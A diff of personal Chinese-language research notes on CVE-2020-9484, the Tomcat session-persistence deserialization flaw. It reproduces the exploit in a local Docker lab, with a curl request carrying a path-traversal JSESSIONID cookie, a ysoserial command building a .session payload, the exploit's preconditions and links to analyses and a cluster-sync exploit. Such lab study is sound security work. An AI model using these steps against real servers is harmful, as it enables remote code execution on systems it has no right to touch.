@@ -143,8 +143,15 @@ CVE-2021-25329 上一个没有处理完
 CVE-2020-9484
 
 https://github.com/masahiro331/CVE-2020-9484
+git clone https://github.com/masahiro331/CVE-2020-9484.git
+docker build -t tomcat:CVE-2020-9484 .
+docker run -d -p 8080:8080 tomcat:CVE-2020-9484
 
-好像没有什么效果
+$ curl 'http://127.0.0.1:8080/index.jsp' -H 'Cookie: JSESSIONID=../../../../../usr/local/tomcat/groovy'
+
+确认，在下面生成了 rce 文件
+$ docker exec -it $CONTAINER /bin/sh
+$ ls /tmp/rce
 
 ```bash
 curl 'http://127.0.0.1:8080/index.jsp' -H 'Cookie: JSESSIONID=../../../../../usr/local/tomcat/groovy'
@@ -152,9 +159,48 @@ curl 'http://192.168.56.130:8080/index.jsp' -H 'Cookie: JSESSIONID=../../../../.
 ```
 
 https://github.com/masahiro331/CVE-2020-9484
-git clone https://github.com/masahiro331/CVE-2020-9484.git
 https://github.com/IdealDreamLast/CVE-2020-9484
+
 https://y4er.com/post/cve-2020-9484-tomcat-session-rce/
+条件：
+1. 不是默认配置，需要手动增加Context.xml
+2. 文件上传 文件后缀需要是.session
+3. 需要知道绝对路径来跨目录
+
+扩展攻击 ，如果用redisSession进行持久化也是可以的
+
+TODO：由于官方不认这个漏洞，看看是不是现在版本还可以攻击？
+Tomcat Remote Code Execution via session persistence 分析【CVE-2020-9484】
+http://www.lmxspace.com/2020/05/21/Tomcat-Remote-Code-Execution-via-session-persistence-%E5%88%86%E6%9E%90%E3%80%90CVE-2020-9484%E3%80%91/#0x05%E5%90%8E%E8%AF%9D
+
+是用来生成 .session shell payload的
+https://github.com/frohoff/ysoserial
+```bash
+mvn clean package -DskipTests
+java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 "touch /tmp/9484" > /tmp/22222.session
+```
+
+扩展：
+Java Deserialization Exploitation With
+Customized Ysoserial Payloads
+https://rhinosecuritylabs.com/research/java-deserializationusing-ysoserial
+Hackvertor
+https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100
+
+https://y4er.com/post/cve-2020-9484-tomcat-session-rce/
+
+生成payload的原理：
+Java 反序列化： 基于 CommonsCollections4 的 Gadget 分析
+https://paper.seebug.org/786/
+Java反序列化漏洞的一些gadget
+https://milkfr.github.io/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2019/08/22/analysis-java-deserialize-gadget-chain/
+
+这里是关于Tomcat默认不安全配置的session的另一个漏洞
+tomcat使用了自带session同步功能时，不安全的配置（没有使用EncryptInterceptor）导致存在的反序列化漏洞，通过精心构造的数据包， 可以对使用了tomcat自带session同步功能的服务器进行攻击。PS:这个不是CVE-2020-9484，9484是session持久化的洞，这个是session集群同步的洞！
+https://github.com/threedr3am/tomcat-cluster-session-sync-exp
+CVE-2020-9484 Tomcat-RCE漏洞分析报告
+https://threedr3am.github.io/2020/06/12/CVE-2020-9484%20Tomcat-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/
+
 https://www.freebuf.com/vuls/245232.html
 https://threedr3am.github.io/2020/06/12/CVE-2020-9484%20Tomcat-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/
 
